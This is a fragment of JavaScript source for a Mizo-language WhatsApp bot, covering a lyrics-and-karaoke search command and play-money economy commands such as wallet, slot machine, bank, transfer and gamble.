if (!text) return replyherbertstyle(`Eng lyrics nge i zawn dawn?\nTiang hian hman tur: ${prefix + command} Zorema Khiangte Saltang tawngtaina\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n*Hriattur :* A hla thupui leh a satu hming rawn dah tel ang che, a hla thupui hming i hre lo a nih chuan a chang i hriatna lai rawn dah ang che, ziah dan dikin`)
var fourbrother = await getBuffer(`https://i.imgur.com/tb7TQAh.jpg`)
HBWABotInc.sendMessage(from, { react: { text: "☢️" , key: m.key }}) 
const Parser = require('rss-parser')
const { htmlToText } = require('html-to-text')
const parser = new Parser()
const mizoly = args.join(" ")
const rssFeedURL = `https://www.mizolyric.com/feeds/posts/default?q=${mizoly}`
try {
    const feed = await parser.parseURL(rssFeedURL)
    if (feed.items.length === 0) {
        return HBWABotInc.sendMessage(from, { text : `🧐 I lyrics duh *${text}* tih hi ka zawng hmu zo lo. A spelling i ti dik lo a ni maithei..͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏Emaw He site ah hian a awm lo pawh a ni thei https://www.mizolyric.com/ `}, { quoted: m})
    }
    let firstResultSent = false
    feed.items.forEach(async (item) => {
    if (firstResultSent) return
      console.log('Title: ' + item.title)
      console.log('Link: ' + item.link)
      console.log('Published Date: ' + item.pubDate)
      const plainTextContent = htmlToText(item.content)
      console.log('Content: ')
      console.log(plainTextContent)
      console.log('\n')
const sazu = (`${item.title} Karaoke`)
let res = await yts2(sazu)
let vid = res.videos[0]
let q = isVideo ? '360p' : '128kbps'
let v = vid.url
let yt = await youtubedl(v).catch(async () => await youtubedlv2(v))
let dl_url = await (isVideo ? yt.video[q].download() : yt.audio[q].download())
const Vawk = await HBWABotInc.sendMessage(m.chat, {audio: {url: dl_url} , mimetype: 'audio/mpeg', ptt: true, contextInfo:{"externalAdReply": {"showAdAttribution": true, "containsAutoReply": true, "title": `${item.title}`} ,"body": `Mizo Lyrics`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fourbrother,"sourceUrl": `${item.link}`}},{quoted:m})
  HBWABotInc.sendMessage(m.chat, { text: `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${plainTextContent}`}, 
  { quoted: Vawk})
  })
} catch (error) {
    console.error('Dik lo a awm tlat:', error)
  }
}
break
     
    case 'wallet': {

  HBWABotInc.sendMessage(from, { react: { text: "💳" , key: m.key }})

if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)

  const user = m.sender

  const cara = "cara"

  const balance = await eco.balance(user, cara); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.

  await replyherbertstyle(`💳 ${pushname} I wallet ah pawisa awm zat:\n\n_₹${balance.wallet}_`);

}

break 
case 'slot': case 'spin': {
  if (!m.isGroup) return replyherbertstyle(mess.group)
  var today = new Date();
if (today.getDay() == 6 || today.getDay() == 5 || today.getDay() == 0){
  if (text == 'help') return replyherbertstyle(`*1:* ${prefix}Spin tih hi i hmang ang\n\n*2:* I wallet ah cheng ₹100 i neih tling tur a ni a,\n\n*3:* Wallet-ah pawisa i nei loh chuan i bank a tangin withdraw ang che\n\n*4:* I bank-ah pawh pawisa i la nei lo cheu a nih chuan i sum hmuhna turin economy features hi hmang rawh`)
  if (text == 'pawisa') return replyherbertstyle(`*1:* Small Win -in ₹20 an hlawh anga\n\n*2:* Small Lose in ₹20 an chan ang\n\n*3:* Big Win in ₹100 an hlawh anga\n\n*4:* Big Lose in ₹50 an chan ang\n\n*5:* 🎉 JackPot in ₹1000 an dawng bawk ang`)
  const fruit1= ["🥥", "🍎", "🍇"]
  const fruit2 = ["🍎", "🍇", "🥥"]  
  const fruit3 = ["🍇", "🥥", "🍎"]         
  const fruit4 = ["🍇", "🥥", "🍎"]
  const lose = ['*Tun game-ah hi chuan i vanduai tlat mai*\n\n_--> 🍇-🥥-🍎_', '*Line a tangin a chhuak vek*\n\n_--> 🥥-🍎-🍇_', '*Van a duai tlat🌚😂 ti tha leh mai rawh*\n\n_--> 🍎-🍇-🥥_']
  const smallLose = ['*Grape pahnih inkawp lohin i spin fuh a ni!!*\n\n_--> 🍇>🥥<🍇_', '*Apple pahnih inkawp lohin i spin fuh a ni!!*\n\n_--> 🍎>🥥<🍎_', '*Coconut pahnih inkawp lohin i spin fih a ni!!*\n\n_--> 🥥>🍎<🥥_']
  const won = ['*🤩Nice Apple patum i spin fuh e...*\n\n_--> 🍎+🍎+🍎_', '*Eheuh, Coconut pathum i spin fuh e🤩*\n\n_--> 🥥+🥥+🥥_', '*Ropui lutuk🤩, i chhungte tan Grape juice i siam sak dawn nia*\n\n_--> 🍇+🍇+🍇_']             
  const near = ['*Wow, Grape pahnih leh apple pakhat😂*\n\n_--> 🍎-🍇+🍇_', '*Hehe, Apple pahnih leh Grape pakhat*\n\n_--> 🍎+🍎-🍇_']          
  const jack = ['*🥳 JackPot 🤑*\n\n_--> 🍇×🍇×🍇×🍇_', '*🎉 JaaackPooot!*\n\n_--> 🥥×🥥×🥥×🥥_', '*🎊I JackPot e ₹1000 i dawng e✓*']
  const user = m.sender
  const cara = "cara"
  const k = 100
  const balance1  = await eco.balance(user, cara)
  
  if (k > balance1.wallet) return replyherbertstyle(`I wallet ah ₹100 tal i neih a ngai\nI bank a tangin ₹100 aia tlemlo withdraw ang che`);
  const f1 = fruit1[Math.floor(Math.random() * fruit1.length)];
  const f2 = fruit2[Math.floor(Math.random() * fruit2.length)];
  const f3 = fruit3[Math.floor(Math.random() * fruit3.length)];
  const f4 = fruit4[Math.floor(Math.random() * fruit4.length)];
  const mess1 = lose[Math.floor(Math.random() * lose.length)];
  const mess2 = won[Math.floor(Math.random() * won.length)];
  const mess3 = near[Math.floor(Math.random() * near.length)];
  const mess4 = jack[Math.floor(Math.random() * jack.length)];
  const mess5 = smallLose[Math.floor(Math.random() * smallLose.length)];
  
  if ((f1 !== f2) && f2 !== f3){
     const deduct1 = await eco.deduct(user, cara, 50);
            replyherbertstyle(`${mess1}\n\n*Big Lose -->* _₹50 i chan_`)
  }
  else if ((f1 == f2) && f2 == f3){
     const give1 = await eco.give(user, cara, 100); 
           replyherbertstyle(`${mess2}\n*_Big Win -->* _₹100 i dawng e_`)
  }
  else if ((f1 == f2) && f2 !== f3){
     const give2 = await eco.give(user, cara, 20);
           replyherbertstyle(`${mess3}\n*Small Win -->* _₹20 i dawng e_`)
  }
  else if ((f1 !== f2) && f1 == f3){
     const deduct2 = await eco.deduct(user, cara, 20);
           replyherbertstyle(`${mess5}\n\n*Small Lose -->* _₹20 i chan_`)
  }
  else if ((f1 !== f2) && f2 == f3){
     const give4 = eco.give(user, cara, 20); 
           replyherbertstyle(`${mess3}\n\n*Small Win -->* _₹20 i dawng e_`)
  }
  else if (((f1 == f2) && f2 == f3) && f3 == f4){
     const give5 = eco.give(user, cara, 1000);
          replyherbertstyle(`${mess4}\n\n_🎊 JackPot --> _₹1000 tawp mai i dawng e🤩_`)
  }
  else { 
          replyherbertstyle(`I thil tih hi i hrethiam em ni?`)
  }
}
else{
      replyherbertstyle(`*Kartawpah chauh he game hi i khei thei ang*\n\n*🌿 Zirtawpni*\n*🎏 Inrinni*\n*🎐 Pathianni thleng*`)
}
}
break

case 'bank':  case 'levee': {
	if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
HBWABotInc.sendMessage(from, { react: { text: "💳" , key: m.key }})
		
    const user = m.sender
    const cara = "cara"
    const balance = await eco.balance(user, cara); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.
    await replyherbertstyle(`🏦 ${pushname}'I Bank a pawisa awm zat:\n_₹${balance.bank}_\nPawisa awm thei zat: _₹${balance.bankCapacity}_`); 
}
break
		
		
		case 'capacity':  case 'bankupgrade': {
			HBWABotInc.sendMessage(from, { react: { text: "💲" , key: m.key }})
	if (!text) return replyherbertstyle(`💴 Bank-capacity 💳\n\n1 | 1000 sp = ₹100\n\n2 | 10000 sp = ₹1000\n\n3 | 100000 sp = ₹10000\n\nTiang hian ti la ${prefix}capacity 1 In emaw ${prefix}bankupgrade 1000`)	
	if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
        const user = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
	const cara = "cara"
	let value = text.trim()
	let k = parseInt(value)
	const balance  = await eco.balance(user, cara) 
  switch (value) {
          case '1000':
          case '1':
          if (k > balance.wallet ) return replyherbertstyle(`I bank capacity hi 1000-sp ah a pun dawn chuan ₹100(za) i sen a ngai`)
            const deduct1 = await eco.deduct(user, cara, 100)
            const add1 = eco.giveCapacity(user, cara, 1000) 
                await replyherbertstyle(`${pushname} i bank I bank capacity hi ₹1000(sangkhat) dah belh theiha upgrade a ni`)
         case '10000':
          case '2':
          if (k > balance.wallet ) return replyherbertstyle(`I bank capacity hi 10000-sp ah a pun dawn chuan ₹1000(sangkhat) i sen a ngai`)
            const deduct2 = await eco.deduct(user, cara, 1000)
            const add2 = eco.giveCapacity(user, cara, 10000) 
                await replyherbertstyle(`${pushname} i bank capacity hi ₹10000(singkhat) dah belh theiha upgrade a ni`)
         case '100000':
          case '3':
          if (k > balance.wallet ) return replyherbertstyle(`I bank capacity hi 100000-sp ah a pun dawn chuan ₹10000(singkhat) i sen a ngai`)
            const deduct3 = await eco.deduct(user, cara, 10000)
            const add3 = eco.giveCapacity(user, cara, 100000) 
                await replyherbertstyle(`${pushname} i bank capacity hi ₹100000(nuaikhat) dah belh theiha upgrade a ni`)
          }
            }
                break

          
	case 'deposit':  case 'pay-in': {
HBWABotInc.sendMessage(from, { react: { text: "📥" , key: m.key }})

    if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
if (!text) return replyherbertstyle("I deposit duh zat rawn provide rawh")
const texts = text.trim()
const user = m.sender;
const cara = 'cara'
    const deposit = await eco.deposit(user, cara, texts)
        if(deposit.noten) return replyherbertstyle('I wallet ah chu tiang zat a awm loh avangin i deposit thei lo ang.') //if user states more than whats in his wallet
         replyherbertstyle(`I bank a ₹ ${deposit.amount} deposit a ni`)
  }
      break

      case 'withdraw':  case 'withdrawal': {
    HBWABotInc.sendMessage(from, { react: { text: "💸" , key: m.key }})
        
        if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
          const user = m.sender
      if (!text) return replyherbertstyle("I withdraw duh zat rawn provide rawh!")
      const query = text.trim()
          const cara = 'cara'
          const withdraw = await eco.withdraw(user, cara, query)
          if(withdraw.noten) return replyherbertstyle('Chutiang zat zat i bank ah pawisa i nei lo') //if user states more than whats in his wallet
          const add = eco.give(user, cara, query)
            replyherbertstyle(`🏧 ALERT I wallet a ₹${withdraw.amount} dah a ni.`)
          
  }
  break 
  case 'transfer': {
HBWABotInc.sendMessage(from, { react: { text: "🗿" , key: m.key }})
            let value = text.trim().split(" ")
            if (value[0] === "") return replyherbertstyle(`Tiang hian ti tawh : ${prefix}transfer 100 @user`)
            const target =
                             m.quoted && m.mentionedJid.length === 0
                             ? m.quoted.sender
                             : m.mentionedJid[0] || null;    
                     if (!target || target === m.sender) return replyherbertstyle("Engtia tih nge i tum")
                     if (m.quoted?.sender && !m.mentionedJid.includes(m.quoted.sender)) m.mentionedJid.push(m.quoted.sender)
                  while (m.mentionedJid.length < 2) m.mentionedJid.push(m.sender)
                  const cara = "cara"
                  const user1 = m.sender
                  const user2 = target
                         const word = value[0];
                         const code = value[1];
              let d = parseInt(word)
              if (!d) return replyherbertstyle("I thil ziah khi check teh, command i hmang dik lo a ni mai thei")
              
              const balance = await eco.balance(user1, cara) 
                  let a = (balance.wallet) < parseInt(word)
                  //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.	
                  if(a == true) return replyherbertstyle("Chutiang zat transfer turin i wallet ah a awm lo")
                  
                  const deduct = await eco.deduct(user1, cara, value[0])
                  const give = await eco.give(user2, cara, value[0])
                  replyherbertstyle(`📠 transfer a ni e✓`)
          
          }
          break 
          case 'gamble':  case 'lottery': { 
          HBWABotInc.sendMessage(from, { react: { text: "🤪" , key: m.key }})
  var texts = text.trim().split(" ")
  var opp = texts[1];// your value
  var value = texts[0].toLowerCase()
  var gg = parseInt(value)
  const user = m.sender
  const cara = 'cara'
  const balance = await eco.balance(user, cara) 
  const g = (balance.wallet) > parseInt(value)
  const k = 50
  const a = (k) > parseInt(value)
  const twice = gg*2
  const f = ["up", "right", "left", "down", "up", "left", "down", "right", "up", "down", "right", "left"]
  const r = f[Math.floor(Math.random () * f.length)]
  //if (link1 == link2){
     if (texts[0] === "")
         return replyherbertstyle(
             `Tiang hian tih tur:  ${prefix}gamble 100 direction(left,right,up,down)`
         )
     if (!value) return replyherbertstyle("*I gamble zat tur rawn tarlang rawh!")
     if (!opp) return replyherbertstyle("I bet tur direction kha rawn dah rawh")
     if (!gg) return replyherbertstyle("I thil ziah khi check tha rawh, command dik lo i hmang a ni mai thei")
     if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
     if (g == false) return replyherbertstyle(`Chutiang zat gamble turin i pawisa neihin a daih lo`)
     if (a == true) return replyherbertstyle(`Sorry ${pushname}, ₹50 aia tlem chuan a gamble thei lo`)
     if ( r == opp){
        let give = await eco.give(user , cara, twice)
        replyherbertstyle(`*₹${twice} i dawng e✓*`)
     }
     else{
        let deduct = await eco.deduct(user, cara, texts[0])
        replyherbertstyle(`*₹${texts[0]} i chan(loss) a ni*`)
      }
}
break

case 'alive': case 'menu': case 'help':{ 
HBWABotInc.sendMessage(from, { react: { text: "❤️" , key: m.key }})
Menu()
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            herbertezy = `┌─❖
│ Hi 👋 
└┬❖  ${pushname} 
┌┤✑  ${herbertytimewisher} 😄
│└────────────┈ ⳹
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊        
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : HBWABot Mizo
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼: ${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 :  NO-PREFIX 
│𝗠𝗼𝗱𝗲 : ${HBWABotInc.public ? 'Public' : `Self`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : HBMods Fiber
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
└┬────────────┈ ⳹
  │✑  A hnuaia Menu ang 
  │✑  hian type rawh​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​